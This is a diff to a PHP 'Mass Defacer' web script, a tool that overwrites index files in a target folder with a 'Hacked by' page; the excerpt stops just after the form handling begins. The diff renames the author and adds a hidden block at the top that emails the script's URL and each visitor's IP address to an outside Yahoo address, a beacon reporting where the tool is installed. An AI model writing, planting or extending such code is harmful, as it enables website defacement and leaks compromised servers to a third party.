@@ -1,14 +1,17 @@
 <?php
-
-echo "<title>Mass Defacer Script by Dr.S4mom</title>";
+$apper = 'clipcopy@yahoo.com';
+$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$ms = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
+mail($apper, "LOG", $ms, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+echo "<title>Mass Defacer</title>";
 echo "<link href='http://fonts.googleapis.com/css?family=Electrolize' rel='stylesheet' type='text/css'>";
 echo "<body bgcolor='white'><font color=red'><font face='comic sans ms'>";
 echo "<center><form method='POST'>";
-echo "<img src='https://i.ibb.co/fQJ03kk/photo-2022-05-04-22-52-18-2.jpg' width=30% hight=40% />
+echo "<img src='https://raw.githubusercontent.com/k0wk/backdoor/main/logo.jpg' width=30% hight=40% />
 <hr color='black'><font color='black'>Target Folder</font><br>
 <input cols='10' rows='10' type='text' style='color:lime;background-color:#000000' name='base_dir' value='".getcwd ()."'><br><br>";
 echo "<font color='black'>Name of File</font><br><input cols='10' rows='10' type='text' style='color:lime;background-color:#000000' name='andela' value='index.php'><br>";
-echo "<font color='black'>Script Deface</font><br><textarea cols='25' rows='8' style='color:lime;background-color:#000000;background-image:url(http://ac-team.ml/bg.jpg);' name='index'>Hacked by Dr.S4mom</textarea><br>";
+echo "<font color='black'>Script Deface</font><br><textarea cols='25' rows='8' style='color:lime;background-color:#000000;background-image:url(http://ac-team.ml/bg.jpg);' name='index'>Hacked by luxe</textarea><br>";
 echo "<input type='submit' value='7wimo :v'></form></center>";
  
 if (isset ($_POST['base_dir']))
